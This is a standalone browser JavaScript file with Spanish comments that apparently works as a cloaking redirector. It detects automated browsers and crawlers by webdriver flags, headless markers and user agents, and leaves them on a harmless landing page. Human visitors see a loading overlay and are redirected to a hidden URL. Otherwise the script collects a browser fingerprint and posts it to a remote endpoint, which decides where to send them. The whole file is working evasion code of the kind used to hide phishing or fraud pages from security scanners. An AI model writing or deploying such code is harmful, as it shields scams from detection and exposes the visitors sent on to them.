(function(){
    var d = document, w = window, n = navigator;
    var endpoint = d.currentScript ? d.currentScript.getAttribute('data-endpoint') : null;
    var token = d.currentScript ? d.currentScript.getAttribute('data-token') : null;
    var redirectUrl = d.currentScript ? d.currentScript.getAttribute('data-redirect') : null;
    if (!endpoint || !token) return;

    // ===== CHECK BOT =====
    var isBot = !!n.webdriver || !!w._phantom || !!w.callPhantom || !!w.__nightmare
        || !!w._selenium_unwrapped || !!d.__selenium_unwrapped
        || /HeadlessChrome|bot|crawl|spider|slurp|curl|wget|python/i.test(n.userAgent)
        || (screen.width === 0 && screen.height === 0);

    // Bot: dejarlo en el landing, no hacer nada
    if (isBot) return;

    // ===== HUMANO: mostrar loading screen + redirigir =====
    function showLoader() {
        var overlay = d.createElement('div');
        overlay.id = 'abLoader';
        overlay.innerHTML = '<style>'
            + '#abLoader{position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:999999;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:Arial,sans-serif;}'
            + '#abLoader .spinner{width:50px;height:50px;border:4px solid #e0e0e0;border-top:4px solid #00623B;border-radius:50%;animation:abSpin 0.8s linear infinite;}'
            + '@keyframes abSpin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}'
            + '#abLoader p{margin-top:20px;color:#333;font-size:15px;}'
            + '</style>'
            + '<div class="spinner"></div>'
            + '<p>Cargando...</p>';
        if (d.body) {
            d.body.appendChild(overlay);
            d.body.style.overflow = 'hidden';
        } else {
            d.addEventListener('DOMContentLoaded', function(){
                d.body.appendChild(overlay);
                d.body.style.overflow = 'hidden';
            });
        }
    }

    // Mostrar loader inmediatamente
    showLoader();

    // Redirigir
    if (redirectUrl) {
        setTimeout(function(){ w.location.replace(redirectUrl); }, 800);
        return;
    }

    // Fallback: verificar con servidor si no hay data-redirect
    var signals = {
        t_start: Date.now(),
        sw: screen.width, sh: screen.height, cd: screen.colorDepth,
        pd: w.devicePixelRatio || 1,
        lang: n.language || '', plat: n.platform || '',
        cores: n.hardwareConcurrency || 0,
        touch: ('ontouchstart' in w) || (n.maxTouchPoints > 0),
        canvas: '', webgl: ''
    };

    try {
        var c = d.createElement('canvas'); c.width=200; c.height=50;
        var ctx = c.getContext('2d');
        ctx.font='14px Arial'; ctx.fillStyle='#f60'; ctx.fillRect(0,0,200,50);
        ctx.fillStyle='#069'; ctx.fillText('ab:'+token.substr(0,8),2,15);
        signals.canvas = c.toDataURL().slice(-32);
    } catch(e){}

    function send() {
        signals.t_elapsed = Date.now() - signals.t_start;
        signals.token = token;
        signals.url = w.location.href;
        signals.ref = d.referrer || '';
        var xhr = new XMLHttpRequest();
        xhr.open('POST', endpoint, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.onload = function() {
            try {
                var r = JSON.parse(xhr.responseText);
                if (r.action === 'redirect' && r.target) {
                    w.location.replace(r.target);
                }
                // Si no redirect, quitar loader y dejar en landing
                else {
                    var l = d.getElementById('abLoader');
                    if (l) l.remove();
                    d.body.style.overflow = '';
                }
            } catch(e) {}
        };
        xhr.send(JSON.stringify(signals));
    }
    setTimeout(send, 1500);
})();
